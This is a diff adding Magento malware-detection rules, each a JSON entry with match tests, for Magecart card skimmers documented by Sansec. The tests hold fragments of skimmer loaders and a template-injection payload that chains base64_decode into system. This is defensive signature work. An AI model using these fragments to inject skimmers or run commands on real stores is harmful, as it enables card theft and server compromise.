+            "description": "Matches the Stripe secret key hardcoded in a Magecart loader that uses Stripe customer metadata as a command server. Secret keys never belong in front-end JavaScript. Source: Sansec, Magecart skimmer turns Stripe into a malware command server.",
+            "test_should_match": [
+                "Authorization: Bearer sk_test_51Shuxz4fAPbvfTkr..."
+            ],
+            "test_should_not_match": [
+                "Authorization: Bearer sk_test_placeholder_key_for_docs",
+                "pk_test_51Shuxz4fAPbvfTkr"
+            ]
+        },
+        {
+            "id": "skimmer-firestore-braintree-tracking-payload",
+            "name": "Skimmer payload pulled from fake Firestore tracking document",
+            "severity": "critical",
+            "source": "https://sansec.io/research/stripe-api-skimmer-infrastructure",
+            "target": [
+                "pub_php",
+                "cms_content"
+            ],
+            "pattern_type": "literal",
+            "pattern": "projects/braintree-payment-app/databases/(default)/documents/tracking/captcha",
+            "description": "Matches the Firestore document path used by a Magecart loader to fetch its payload while posing as bot-protection traffic. Source: Sansec, Magecart skimmer turns Stripe into a malware command server.",
+            "test_should_match": [
+                "https://firestore.googleapis.com/v1/projects/braintree-payment-app/databases/(default)/documents/tracking/captcha?key=AIzaSy"
+            ],
+            "test_should_not_match": [
+                "https://firestore.googleapis.com/v1/projects/my-store-app/databases/(default)/documents/orders"
+            ]
+        },
+        {
+            "id": "svg-onload-atob-setTimeout-payload",
+            "name": "SVG onload executing base64 payload via setTimeout",
+            "severity": "critical",
+            "source": "https://sansec.io/research/svg-onload-magecart-skimmer",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "onload=\"(()=>{setTimeout(atob('KGZ1bmN0aW9uKCl7IGlm",
+            "description": "Matches a 1px SVG whose onload attribute runs setTimeout(atob(...)) on a base64 string that decodes to a function body. Used to inject the skimmer through CMS blocks or static content. Source: Sansec, SVG onload Magecart skimmer.",
+            "test_should_match": [
+                "<svg\n  width=\"1px\"\n  height=\"1px\"\n  onload=\"(()=>{setTimeout(atob('KGZ1bmN0aW9uKCl7IGlm...'),1)})()\""
+            ],
+            "test_should_not_match": [
+                "<svg width=\"24px\" height=\"24px\" onload=\"console.log('ready')\"></svg>"
+            ]
+        },
+        {
+            "id": "svg-skimmer-xor-script-key",
+            "name": "Skimmer XOR-encodes payload with the key \"script\"",
+            "severity": "critical",
+            "source": "https://sansec.io/research/svg-onload-magecart-skimmer",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "raw.charCodeAt(i) ^ \"script\".charCodeAt(i % 6)",
+            "description": "Matches the XOR encoding loop that keys a JSON payload with the word \"script\" before base64 encoding it for exfiltration. Source: Sansec, SVG onload Magecart skimmer.",
+            "test_should_match": [
+                "    raw.charCodeAt(i) ^ \"script\".charCodeAt(i % 6),"
+            ],
+            "test_should_not_match": [
+                "    raw.charCodeAt(i) ^ key.charCodeAt(i % key.length),"
+            ]
+        },
+        {
+            "id": "svg-skimmer-mgx-cv-flag",
+            "name": "Skimmer localStorage _mgx_cv run-once flag",
+            "severity": "warning",
+            "source": "https://sansec.io/research/svg-onload-magecart-skimmer",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "localStorage.setItem('_mgx_cv', '1')",
+            "description": "Matches the localStorage flag set by the skimmer so it runs only once per visitor. The _mgx_cv key is specific to this kit. Source: Sansec, SVG onload Magecart skimmer.",
+            "test_should_match": [
+                "localStorage.setItem('_mgx_cv', '1')"
+            ],
+            "test_should_not_match": [
+                "localStorage.setItem('cart_count', '1')"
+            ]
+        },
+        {
+            "id": "trojanorder-competitor-payload-filter",
+            "name": "Injected php://input filter blocking addafterfiltercallback payloads",
+            "severity": "warning",
+            "source": "https://sansec.io/research/trojanorder-magento",
+            "target": [
+                "pub_php",
+                "generated_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "preg_match('/addafterfiltercallback/si', preg_replace(\"/[^A-Za-z]/\", '', urldecode(urldecode(file_get_contents(\"php://input\")))))",
+            "description": "Matches the PHP guard that reads the raw request body and returns 503 when it contains addafterfiltercallback, the Magento template-injection marker. The attacker uses this to lock out other exploiters of the same store. Source: Sansec, TrojanOrder Magento.",
+            "test_should_match": [
+                "if(preg_match('/addafterfiltercallback/si', preg_replace(\"/[^A-Za-z]/\", '', urldecode(urldecode(file_get_contents(\"php://input\")))))) {"
+            ],
+            "test_should_not_match": [
+                "if(preg_match('/^json$/i', $contentType)) {"
+            ]
+        },
+        {
+            "id": "stored-template-callback-chain-base64-system",
+            "name": "Template filter callback chain to base64_decode and system",
+            "severity": "critical",
+            "source": "https://sansec.io/research/vendors-defeat-magento-security-patch-simple-check",
+            "target": [
+                "cms_content"
+            ],
+            "pattern_type": "literal",
+            "pattern": "addAfterFilterCallback(base64_decode).addAfterFilterCallback(system)",
+            "description": "Matches the template-filter payload that chains addAfterFilterCallback(base64_decode) with addAfterFilterCallback(system) to run an OS command through Magento's template engine, the patch-bypass technique in the article. The callback chain is specific to this exploit. Source: Sansec, Vendors defeat Magento security patch (+ simple check).",
+            "test_should_match": [
+                "{{var this.getTemplateFilter().addAfterFilterCallback(base64_decode).addAfterFilterCallback(system).filter(ZWNobyAndnVsbmVyYWJsZSc=)}}"
+            ],
+            "test_should_not_match": [
+                "{{var this.getTemplateFilter().addAfterFilterCallback(trim).filter(name)}}",
+                "{{var this.getTemplateFilter().addAfterFilterCallback(base64_decode).filter(data)}}"
+            ]
+        },
+        {
+            "id": "webrtc-datachannel-payload-loader",
+            "name": "WebRTC data channel used to receive and execute skimmer payload",
+            "severity": "critical",
+            "source": "https://sansec.io/research/webrtc-skimmer",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "var channel = conn.createDataChannel(location.href);",
+            "description": "Matches the loader that opens a WebRTC data channel named after the page URL, collects chunks sent by the attacker and executes them as script. Source: Sansec, WebRTC skimmer.",
+            "test_should_match": [
+                "  var channel = conn.createDataChannel(location.href);"
+            ],
+            "test_should_not_match": [
+                "  var channel = conn.createDataChannel('chat');"
+            ]
+        },
+        {
+            "id": "webrtc-skimmer-hardcoded-ice-password",
+            "name": "Hardcoded WebRTC ICE password of WebRTC skimmer C2",
+            "severity": "critical",
+            "source": "https://sansec.io/research/webrtc-skimmer",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "a=ice-pwd:05l0TstonL9bYAdB04I6x2",
+            "description": "Matches the fixed ICE password spoofed into the SDP offer by the WebRTC skimmer loader. Source: Sansec, WebRTC skimmer.",
+            "test_should_match": [
+                "          \"a=ice-pwd:05l0TstonL9bYAdB04I6x2\","
+            ],
+            "test_should_not_match": [
+                "          \"a=ice-pwd:\" + randomPassword,"
+            ]
+        },
+        {
+            "id": "skimmer-sessiid-cookie-exfil",
+            "name": "Skimmer SESSIID tracking cookie set with timestamp",
+            "severity": "warning",
+            "source": "https://sansec.io/research/widespread-credit-card-hijacking-discovered",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "\"SESSIID=\" + new Date().getTime()",
+            "description": "Creates the SESSIID cookie that the skimmer sends back with stolen checkout data. Source: Sansec, widespread credit card hijacking.",
+            "test_should_match": [
+                "j(\"SESSIID\") || (document.cookie = \"SESSIID=\" + new Date().getTime());"
+            ],
+            "test_should_not_match": [
+                "document.cookie = \"SESSIONID=\" + new Date().getTime();"
+            ]
+        }
+    ]
+}
